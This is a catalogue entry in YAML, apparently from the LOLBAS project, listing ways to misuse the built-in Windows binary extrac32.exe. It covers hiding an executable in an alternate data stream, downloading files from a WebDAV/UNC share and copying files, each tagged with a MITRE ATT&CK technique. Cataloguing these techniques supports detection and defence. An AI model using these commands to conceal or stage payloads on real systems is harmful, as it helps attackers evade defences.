---
Name: Extrac32.exe
Description: 
Author: 'Oddvar Moe'
Created: '2018-05-25'
Commands:
  - Command: extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
    Description: Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.
    Usecase: Extract data from cab file and hide it in an alternate data stream. 
    Category: ADS
    Privileges: User
    MitreID: T1096
    MitreLink: https://attack.mitre.org/wiki/Technique/T1096
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe
    Description: Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.
    Usecase: Extract data from cab file and hide it in an alternate data stream. 
    Category: ADS
    Privileges: User
    MitreID: T1096
    MitreLink: https://attack.mitre.org/wiki/Technique/T1096
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
    Description: Copy the source file to the destination file and overwrite it.
    Usecase: Download file from UNC/WEBDav
    Category: Download
    Privileges: User
    MitreID: T1105
    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe
    Description: Command for copying calc.exe to another folder
    Usecase: Copy file
    Category: Copy
    Privileges: User
    MitreID: T1105
    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\extrac32.exe
  - Path: C:\Windows\SysWOW64\extrac32.exe
Code_Sample: 
- Code:
Detection:
 - IOC: 
Resources:
  - Link: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
  - Link: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
  - Link: https://twitter.com/egre55/status/985994639202283520
Acknowledgement:
  - Person: egre55
    Handle: '@egre55'
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
  - Person: Hai Vaknin(Lux
    Handle: '@VakninHai'
  - Person: Tamir Yehuda
    Handle: '@tim8288'
---